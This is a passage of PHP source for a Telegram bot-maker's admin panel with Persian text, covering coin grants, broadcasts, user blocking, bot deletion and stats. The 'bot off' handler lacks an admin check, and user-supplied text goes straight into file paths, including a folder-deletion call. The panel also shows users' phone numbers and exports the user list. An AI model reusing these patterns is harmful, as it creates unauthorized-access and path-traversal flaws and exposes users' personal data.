'chat_id'=>$chat_id,
'text'=>"⛔ متن خاموش ربات را ارسال کنید",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"پنل"]],
],
'resize_keyboard'=>true,
])
]);
}}
elseif($step =="khamoshiii" && $text !="پنل" ){
file_put_contents("dataPaMicK/$from_id/step.txt","none");
file_put_contents("admin/khamoshiii.json",$text);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"با موفقیت تنظیم شد 📂",
]);
}

elseif($text == "🎗 | تنظیم متن دریافت توکن" && $chat_id == $Dev){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
file_put_contents("dataPaMicK/$from_id/step.txt","texttokeen");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"🎗 متن دریافت توکن را ارسال کنید",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"پنل"]],
],
'resize_keyboard'=>true,
])
]);
}}
elseif($step =="texttokeen" && $text !="پنل" ){
file_put_contents("dataPaMicK/$from_id/step.txt","none");
file_put_contents("admin/texttokeen.json",$text);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"با موفقیت تنظیم شد 📂",
]);
}

elseif($text == "👤 | تنظیم متن بنر زیرمجوعه" && $chat_id == $Dev){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
file_put_contents("dataPaMicK/$from_id/step.txt","textbanerrr");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"🔙 متن زیرمجموعه ربات را ارسال کنید",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"پنل"]],
],
'resize_keyboard'=>true,
])
]);
}}
elseif($step =="textbanerrr" && $text !="پنل" ){
file_put_contents("dataPaMicK/$from_id/step.txt","none");
file_put_contents("admin/textbanerrr.json",$text);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"با موفقیت تنظیم شد 📂",
]);
}

elseif($text == "🔙 | تنظیم متن برگشت" && $chat_id == $Dev){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
file_put_contents("dataPaMicK/$from_id/step.txt","textback");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"🔙 متن برگشت ربات را ارسال کنید",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"پنل"]],
],
'resize_keyboard'=>true,
])
]);
}}
elseif($step =="textback" && $text !="پنل" ){
file_put_contents("dataPaMicK/$from_id/step.txt","none");
file_put_contents("admin/textback.json",$text);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"با موفقیت تنظیم شد 📂",
]);
}

elseif($text1 == "📝 | تنظیم متن استارت" && $chat_id == $Dev){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
file_put_contents("dataPaMicK/$from_id/step.txt","textstarttt");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"📝 متن استارت خود را ارسال کنید",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"پنل"]],
],
'resize_keyboard'=>true,
])
]);
}}
elseif($step =="textstarttt" && $text !="پنل" ){
file_put_contents("dataPaMicK/$from_id/step.txt","none");
file_put_contents("admin/textstarttt.json",$text);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"با موفقیت تنظیم شد 📂",
]);
}
//=============================================================//
elseif($text1 == "بخش مبادلات 💸"){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
bot('sendMessage', [
'chat_id' =>$chat_id,
'text' =>"مدیر عزیز به پنل مدیریت خوش آمدید 🌹",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'🎊 | سکه همگانی'],['text'=>"🎉 | ساخت کد هدیه"]],
[['text'=>"🛠 | حذف ربات"]],
[['text'=>'💎 | ارسال سکه'],['text'=>'💎 | کسر سکه']],
[['text'=>"📩 | پیام به کاربر"]],
[['text'=>"⚠️ | اخطار به کاربر"]],
[['text'=>'آنبلاک کردن ✅'],['text'=>'❌ | بلاک کاربر']],
[['text'=>"پنل"]],
],
'resize_keyboard'=>true
])
]);
}else{
sendMessage($chat_id,"
شما @$suporttt نیسی🤣🌹","HTML");
}
}

elseif($text1 == "🎊 | سکه همگانی"){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
file_put_contents("dataPaMicK/$from_id/step.txt","coin to all");
        bot('sendMessage', [
                'chat_id' =>$chat_id,
                'text' =>"
✅ | مقدار سکه همگانی را وارد کنید !
مقدار را بین 1 تا 10 ارسال کنید",
				'reply_to_message_id' => $message_id,
               'parse_mode'=>'HTML',
			       'reply_markup'=>json_encode([
      'keyboard'=>[
	  [['text'=>'↩ | بازگشت‌']],
      ],'resize_keyboard'=>true])
	]);
}}

elseif($step == "coin to all" && $text != "↩ | بازگشت‌"){
if(is_numeric($text) and $text >= 1 and $text <= 10){
if(preg_match('/^([0-9])/',$text)){
file_put_contents("dataPaMicK/$from_id/wait.txt",$text);
file_put_contents("dataPaMicK/$from_id/step.txt","coin to all 2");
        bot('sendMessage', [
                'chat_id' =>$chat_id,
                'text' =>"⁉️ آیا ارسال $text سکه به تمام کاربران ربات را تایید میکنید ؟

بله یا خیر؟",
				'reply_to_message_id' => $message_id,
               'parse_mode'=>'HTML',
			       'reply_markup'=>json_encode([
      'keyboard'=>[
	  [['text'=>'↩ | بازگشت‌']],
	  [['text'=>"خیر"],['text'=>"بله"]],
      ],'resize_keyboard'=>true])
	]);
}else{
        bot('sendMessage', [
                'chat_id' =>$chat_id,
                'text' =>"⚠️ ورودی نامعتبر است !
👈🏻 لطفا فقط عدد ارسال کنید :",
				'reply_to_message_id' => $message_id,
               'parse_mode'=>'HTML',
			       'reply_markup'=>json_encode([
      'keyboard'=>[
	  [['text'=>'↩ | بازگشت‌']],
      ],'resize_keyboard'=>true])
	]);
}}else{
bot('sendMessage', [
'chat_id' =>$chat_id,
'text' =>"
تعداد سکه را بین 1 تا 10 ارسال کنید !!!!
    
",
'reply_to_message_id' => $message_id,
'parse_mode'=>'HTML',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'↩ | بازگشت‌']],
],'resize_keyboard'=>true])
]);
}
}
elseif($step == "coin to all 2" && $text != "↩ | بازگشت‌"){
if($text == "خیر"){
unlink("dataPaMicK/$from_id/wait.txt");
file_put_contents("dataPaMicK/$from_id/step.txt",'none');
        bot('sendMessage', [
                'chat_id' =>$chat_id,
                'text' =>"✅ با موفقیت لغو شد !",
				'reply_to_message_id' => $message_id,
               'parse_mode'=>'HTML',
        	'reply_markup'=>json_encode([
      'keyboard'=>[
	  [['text'=>'↩ | بازگشت‌']],
      ],'resize_keyboard'=>true])
	]);
}
elseif($text == "بله"){
$Member = explode("\n",$list);
$count = count($Member)-2;
file_put_contents("dataPaMicK/$from_id/step.txt",'none');
for($z = 0;$z <= $count;$z++){
$user = $Member[$z];
if($user != "\n" && $user != " "){
	$id = json_decode(file_get_contents("https://api.telegram.org/bot".API_KEY."/getChat?chat_id=".$user));
	$user2 = $id->result->id;
if($user2 != null){
$coin = file_get_contents("dataPaMicK/$user/coin.txt");
file_put_contents("dataPaMicK/$user/coin.txt",$coin + $wait);
        bot('sendMessage', [
                'chat_id' =>$user,
                'text' =>"
سلام عزیزم با موفقیت مقدار $wait سکه به حساب شما افزوده شد سکه همگانی 😘
رباتو دوباره استارت کن /start ✔
",
               'parse_mode'=>'html'
	]);
}
}
}
unlink("dataPaMicK/$from_id/wait.txt");
        bot('sendMessage', [
                'chat_id' =>$chat_id,
                'text' =>"✅ با موفقیت به تمام اعضا مقدار $wait سکه ارسال شد !",
				'reply_to_message_id' => $message_id,
               'parse_mode'=>'HTML',
        	'reply_markup'=>json_encode([
      'keyboard'=>[
	  [['text'=>'↩ | بازگشت‌']],
      ],'resize_keyboard'=>true])
	]);
}else{
        bot('sendMessage', [
                'chat_id' =>$chat_id,
                'text' =>"💢 لطفا فقط از کیبورد زیر انتخاب کنید :",
				'reply_to_message_id' => $message_id,
               'parse_mode'=>'HTML',
			       'reply_markup'=>json_encode([
      'keyboard'=>[
	  [['text'=>'↩ | بازگشت‌']],
	  [['text'=>"خیر"],['text'=>"بله"]],
      ],'resize_keyboard'=>true])
	]);
}
}

elseif($text == "🤖 | تنظیم متن اسپانسر" && $chat_id == $Dev){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
file_put_contents("dataPaMicK/$from_id/step.txt","sponserr");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"🤖 متن اسپانسر ربات را ارسال کنید",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"پنل"]],
],
'resize_keyboard'=>true,
])
]);
}}
elseif($step =="sponserr" && $text !="پنل" ){
file_put_contents("dataPaMicK/$from_id/step.txt","none");
file_put_contents("admin/sponserr.json",$text);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"با موفقیت تنظیم شد 📂",
]);
}


elseif($text == "🛍 | تنظیم متن خرید" && $chat_id == $Dev){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
file_put_contents("dataPaMicK/$from_id/step.txt","buuuyyycoinn");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"🔰 متن خرید سکه ربات را ارسال کنید",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"پنل"]],
],
'resize_keyboard'=>true,
])
]);
}}
elseif($step =="buuuyyycoinn" && $text !="پنل" ){
file_put_contents("dataPaMicK/$from_id/step.txt","none");
file_put_contents("admin/buuuyyycoinn.json",$text);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"با موفقیت تنظیم شد 📂",
]);
}

elseif($text1 == "💎 | کسر سکه"){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
file_put_contents("dataPaMicK/$from_id/step.txt","kasremm");
bot('sendmessage',[
'chat_id' => $Dev,
'text' =>"🍇ایدی عددی کاربر را وارد کنید:",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"↩ | بازگشت‌"]],
],
'resize_keyboard'=>true,
])
]);
}}
elseif($step == "kasremm" && $text !="↩ | بازگشت‌" ){
file_put_contents("dataPaMicK/$from_id/step.txt","kasrem");
$text20 = $message->text;
file_put_contents("dataPaMicK/$from_id/token.txt",$text20);
$coin1 = file_get_contents("dataPaMicK/$text20/coin.txt");
bot('sendmessage', [
'chat_id' => $Dev,
'text' =>"
این فرد $coin1 سکه دارد
چه مقدار سکه کسر شود؟
",
]);
}
elseif($step == "kasrem"){
file_put_contents("dataPaMicK/$from_id/step.txt","none");
$text20 = $message->text;
$coin = file_get_contents("dataPaMicK/$to/coin.txt");
settype($coin,"integer");
$newcoin = $coin - $text20;
save("dataPaMicK/$to/coin.txt",$newcoin);
$cooin = $coin - $text20;
bot('sendmessage', [
'chat_id' => $Dev,
'text' =>"به فرد $text20 سکه کسر شد و سکه های او تا الان $cooin میباشد!",
]);
bot('sendmessage',[
'chat_id' => $to,
'text' =>"مقدار $text20 سکه از شما کسر شد! 🍒",
]);
}

elseif($text1 == "⚠️ | اخطار به کاربر"){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
file_put_contents("dataPaMicK/$from_id/metiwolf.txt","iQeuclclco");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"ایدی فرد را ارسال کنید",
'parse_mode'=>"HTML",  
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"↩ | بازگشت‌"]],
],
'resize_keyboard'=>true,
])
]);
}}
elseif($metiwolf == "iQeuclclco" && $text !="↩ | بازگشت‌" ){
file_put_contents("dataPaMicK/$from_id/metiwolf.txt","sendpQefjcpm");
file_put_contents("dataPaMicK/$from_id/info.txt","$text");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"تعداد اخطاری که میخوایید بهش بدید؟",
'parse_mode'=>"HTML",  
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🔙 | بازگشت‌"]],
],
'resize_keyboard'=>true,
])
]);
}
elseif($metiwolf == "sendpQefjcpm"){
file_put_contents("dataPaMicK/$from_id/metiwolf.txt","none");
$info = file_get_contents("dataPaMicK/$from_id/info.txt");
file_put_contents("dataPaMicK/$info/warn.txt",$text);
bot('sendMessage',[
'chat_id'=>$info,
'text'=>"
⚠️شما از طرف مدیریت مقدار $text اخطار دریافت کردید 

⛔️بعد از رسیدن به 3 اخطار از ربات مسدود خواهید شد
",
'parse_mode'=>'HTML',
]);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"اخطار با موفقیت ارسال شد",
'parse_mode'=>'HTML',
]);
}

elseif($text1 == "🛠 | حذف ربات" ){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
file_put_contents("dataPaMicK/$from_id/step.txt","delezi");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
ایدی ربات خود را وارد کنید.......!
ایدی ربات را بدون | @ |  وارد کنید !
",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'↩ | بازگشت‌']],
],
'resize_keyboard'=>true,
])
]);
}}
elseif($step =="delezi" && $text !="↩ | بازگشت‌" ){
file_put_contents("dataPaMicK/$from_id/step.txt","none");
deletefolder("PaMicKCreaT/$text");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"ربات حذف شد ✅",
'parse_mode'=>"MarkDown",  
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"↩ | بازگشت‌"]],
],
'resize_keyboard'=>true,
])
]);
}

elseif($text1 == "📩 | پیام به کاربر"){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
file_put_contents("dataPaMicK/$from_id/state.txt","info");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"✉️ | لطفا ایدی عددی کاربر مورد نظر را ارسال کنید !",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'↩ | بازگشت‌']],
],
'resize_keyboard'=>true,
])
]);
}}
elseif($state == "info" && $text !="↩ | بازگشت‌" ){
file_put_contents("dataPaMicK/$from_id/state.txt","sendpm");
file_put_contents("dataPaMicK/$from_id/info.txt","$text");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"📨 | پیام خود را ارسال کنید تا به کاربر مورد نظر ارسال کنم !",
'parse_mode'=>"HTML",  
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"↩ | بازگشت‌"]],
],
'resize_keyboard'=>true,
])
]);
}
elseif($state== "sendpm"){
file_put_contents("dataPaMicK/$from_id/state.txt","none");
file_put_contents("dataPaMicK/$from_id/sendpm.txt","$text");
$sendpm = file_get_contents("dataPaMicK/$from_id/sendpm.txt");
$info = file_get_contents("dataPaMicK/$from_id/info.txt");
bot('sendMessage',[
'chat_id'=>$info,
'text'=>"
🔍 | شما یک پیام از طرف مالک ربات دریافت کردید ! 
➖➖➖➖➖
📝 | پیام ارسال شده : 
$sendpm

➖➖➖➖➖
",
'parse_mode'=>'HTML',
]);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"🖥 | پیام شما به کاربر گرامی مورد نظر ارسال شد .",
'parse_mode'=>'HTML',
]);
}
elseif($text1 == "آمار ربات شما 📊"){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
$user = file_get_contents("users.txt");
$member_id = explode("\n",$user);
$member_count = count($member_id) -1;
$userb = file_get_contents("dataPaMicK/blocklist.txt");
$member_idb = explode("\n",$userb);
$member_countb = count($member_idb) -1;
$load = sys_getloadavg();
$mem = memory_get_usage();
$ver = phpversion();           
$memch = bot('getChatMembersCount',['chat_id'=>'@'.$channel])->result;
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
📈 آمار ربات شما بدین شرح میباشد :

👤 تعداد کاربران ربات : $member_count
❌ تعداد افراد مسدود : $member_countb

👈🏻 اعضای فعلی کانال » $memch

پینگ 📉 ️ : $load[0]
ورژن پی اچ پی 📌️ : $ver
میزان مصرف حافظه 📁 : $mem KB

" ,
]);
}}
elseif($text1 == "✉️ ارسال پیام"){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
file_put_contents("dataPaMicK/$from_id/step.txt","pm");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"📨 | پیام خود را ارسال کنید !",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'↩ | بازگشت‌']],
],
'resize_keyboard'=>true
])
]);
}}
elseif($step == "pm" && $text != "↩ | بازگشت‌"){
file_put_contents("dataPaMicK/$from_id/step.txt","none");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"📥 | پیام شما با موفقیت ارسال شد !",
]);
$all_member = fopen( "users.txt", "r");
while( !feof( $all_member)){
$user = fgets( $all_member);
sendMessage($user,$text1,"html");
}
}

if($text == "📨 فوروارد پیام"){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
file_put_contents("dataPaMicK/$from_id/step.txt","forr");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"پیام خود را به ربات 📨 فوروارد کنید.",
'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"↩ | بازگشت‌"]],
]
])
]);
}}
elseif($step == "forr" && $text != "↩ | بازگشت‌"){
file_put_contents("dataPaMicK/$from_id/step.txt","none");
$user = file_get_contents("users.txt");
$all_member = explode("\n",$user); 
for ($i=0;$i<=count($all_member)-1;$i++){ 
$koja = $all_member["$i"];
bot('ForwardMessage',[
'chat_id'=>$koja,
'from_chat_id'=>$chat_id,
'message_id'=>$message_id]);
}
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"پیام شما با موفقیت به تمام اعضا فروارد شد✅",
]);
}

elseif($text1 == "💎 | ارسال سکه"){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
file_put_contents("dataPaMicK/$from_id/step.txt","fromidforcoin");
bot('sendMessage',[
'chat_id' => $Dev,
'text' =>"✅ | ایدی عددی کاربر مورد نظر را ارسال کنید !",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"↩ | بازگشت‌"]],
],
'resize_keyboard'=>true,
])
]);
}}
elseif($step == "fromidforcoin" && $text !="↩ | بازگشت‌" ){
file_put_contents("dataPaMicK/$from_id/step.txt","tedadecoin4set");
$text20 = $message->text;
file_put_contents("dataPaMicK/$from_id/token.txt",$text20);
$coin1 = file_get_contents("dataPaMicK/$text20/coin.txt");
bot('sendMessage', [
'chat_id' => $Dev,
'text' =>"
♻️ | این فرد $coin1 سکه دارد !
چقدر سکه به این کاربر گرامی سکه ارسال شود ؟
",
]);
}
elseif($step == "tedadecoin4set"){
file_put_contents("dataPaMicK/$from_id/step.txt","none");
$text20 = $message->text;
$coin = file_get_contents("dataPaMicK/$to/coin.txt");
settype($coin,"integer");
$newcoin = $coin + $text20;
save("dataPaMicK/$to/coin.txt",$newcoin);
$cooin = $coin + $text20;
bot('sendMessage', [
'chat_id' => $Dev,
'text' =>"به فرد $text20 سکه اضافه شد و سکه های او تا الان $cooin میباشد!",
]);
bot('sendMessage',[
'chat_id' => $to,
'text' =>"🎊 | از طرف مدیریت ربات به شما $text20 سکه ارسال شد !",
]);
}

elseif($text1 == "❌ | بلاک کاربر"){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
file_put_contents("dataPaMicK/$from_id/metiwolf.txt","shar");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"لطفا ایدی فرد مورد نظر را ارسال کنید",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'↩ | بازگشت‌']],
],'resize_keyboard'=>true,])
]);
}}
elseif($metiwolf == "shar" && $text !="↩ | بازگشت‌" ){
file_put_contents("dataPaMicK/$from_id/shar.txt","$text");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
ایدی $text از ربات بلاک شد
",
]);
$adduser = file_get_contents("dataPaMicK/blocklist.txt");
$adduser .= $text . "\n";
file_put_contents("dataPaMicK/blocklist.txt", $adduser);
file_put_contents("dataPaMicK/$from_id/metiwolf.txt","no");
$id11 = file_get_contents("dataPaMicK/$from_id/shar.txt");
bot('sendMessage',[
'chat_id'=>$id11,
'text'=>"ارتباط شما با سرور ما قطع شد و نمیتوانید از بات استفاده کنید 😹",
]);
}

elseif($text1 == "آنبلاک کردن ✅"){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
file_put_contents("dataPaMicK/$from_id/step.txt","none");
file_put_contents("dataPaMicK/$from_id/step.txt","sharr");
bot('Sendmessage',[
'chat_id'=>$chat_id,
'text'=>"لطفا ایدی عددی کاربر مورد نظر رو ارسال کنید",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'↩ | بازگشت‌']],
],])
]);
}}
elseif($step == "sharr" && $text !="↩ | بازگشت‌" ){
$newlist = str_replace($text, "", $blocklist);
file_put_contents("dataPaMicK/blocklist.txt", $newlist);
file_put_contents("dataPaMicK/$chat_id/step.txt", "No");
bot('Sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
خب ایدی $text از بلاکی درآمد 😎
",
]);
}

elseif($text1 == "پیام به کاربر📭"){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
file_put_contents("dataPaMicK/$from_id/metiwolf.txt","info1");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"لطفا شناسه کاربر را وارد کنید💉",
'parse_mode'=>"HTML",  
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🔙 | بازگشت‌"]],
],
'resize_keyboard'=>true,
])
]);
}}
elseif($metiwolf == "info1" && $text !="🔙 | بازگشت‌" ){
file_put_contents("dataPaMicK/$from_id/metiwolf.txt","sendpem");
file_put_contents("dataPaMicK/$from_id/info.txt","$text");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"لطفا پیام خود را وارد کنید✏",
'parse_mode'=>"HTML",  
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🔙 | بازگشت‌"]],
],
'resize_keyboard'=>true,
])
]);
}
elseif($metiwolf == "sendpem" && $text !="🔙 | بازگشت‌" ){
file_put_contents("dataPaMicK/$from_id/metiwolf.txt","none");
file_put_contents("dataPaMicK/$from_id/sendpm.txt","$text");
$sendpm = file_get_contents("dataPaMicK/$from_id/sendpm.txt");
$info = file_get_contents("dataPaMicK/$from_id/info.txt");
bot('sendMessage',[
'chat_id'=>$info,
'text'=>"
شما یک پیام از پشتیبانی دارید 👨🏼‍💻

📨↝ $sendpm ↜📨

 💫| کد پیام :$message_id
  ⏰|  ساعت : $time
🗓️|  تاریخ : $ambar
 
 
",
'parse_mode'=>'HTML',
]);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"پیام شما به کاربر مورد نظر ارسال شد📮",
'parse_mode'=>"HTML",  
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'پیام به کاربر📭']],
[['text'=>"🔙 | بازگشت‌"]],
],
'resize_keyboard'=>true,
])
]);
}

elseif($text1 == "‼️ | اطلاعات کاربر"){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
file_put_contents("dataPaMicK/$from_id/step.txt","informatin");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"ایدی عددی شخص را ارسال کنید.",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'↩ | بازگشت‌']],
],
'resize_keyboard'=>true
])
]);
}}
elseif($step == "informatin" && $text !="↩ | بازگشت‌" ){
file_put_contents("dataPaMicK/$from_id/step.txt","$text");
$zirs = file_get_contents('dataPaMicK/'.$text."/membrs.txt");
$account = file_get_contents('dataPaMicK/'.$text."/account.txt");
$coin = file_get_contents('dataPaMicK/'.$text."/coin.txt");
$phone = file_get_contents('dataPaMicK/'.$text."/bots.txt");
$phon = file_get_contents('dataPaMicK/'.$text."/phone.txt");
$txtt = file_get_contents("dataPaMicK/$text/mems.txt");
$member_id = explode("\n",$txtt);
$mm1 = count($member_id)-1;
unset($member_id[$mm1]);
foreach($member_id as $id => $value){
$new .= "[$value](tg://user?id=$value)\n";
}
sendMessage($chat_id,"
نوع حساب کاربر: $account
پیوی کاربر: [$text](tg://user?id=$text) 
موجودی کاربر : $coin
زیرمجوعه های شخص :$zirs
ربات های شخص : $phone
شماره تلفن شخص : $phon
 ","MarkDown","true");
}
elseif($text1 == "❌ | خاموش ربات"){
file_put_contents("dataPaMicK/onof.txt","off");
 bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"〽️ | ربات با موفقیت خاموش شد",
'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[
['text'=>"↩ | بازگشت‌"],
],
]
])
]);
}

elseif($text1 == "✅ | روشن ربات"){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
file_put_contents("dataPaMicK/onof.txt","on");
 bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"〽️ | ربات با موفقیت روشن شد",
'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[
['text'=>"↩ | بازگشت‌"],
],
]
])
]);
}}

elseif($text1 == "👤 | خاموش پشتیبانی"){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
file_put_contents("dataPaMicK/poshtibannn.txt","off");
 bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"پشتیبانی خاموش شد شد ❌",
'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[
['text'=>"↩ | بازگشت‌"],
],
]
])
]);
}}
elseif($text1 == "👤 | روشن پشتیبانی"){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
file_put_contents("dataPaMicK/poshtibannn.txt","on");
 bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"پشتیبانی روشن شد ✅",
'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[
['text'=>"↩ | بازگشت‌"],
],
]
])
]);
}}

 elseif($text == "🔖 دریافت لیست ممبر"){
if($from_id == $Dev or $from_id == $admin or $from_id == $admin2){
$user["step"] = "none";
$outjson = json_encode($user,true);
file_put_contents("dataPaMicK/$from_id.json",$outjson);
bot('senddocument',[
'chat_id'=>$chat_id,
'document'=>new CURLFile("users.txt"),
'caption'=>"👌 لیست آیدی عددی افراد ربات!"
]);
}}


unlink('error_log');
?>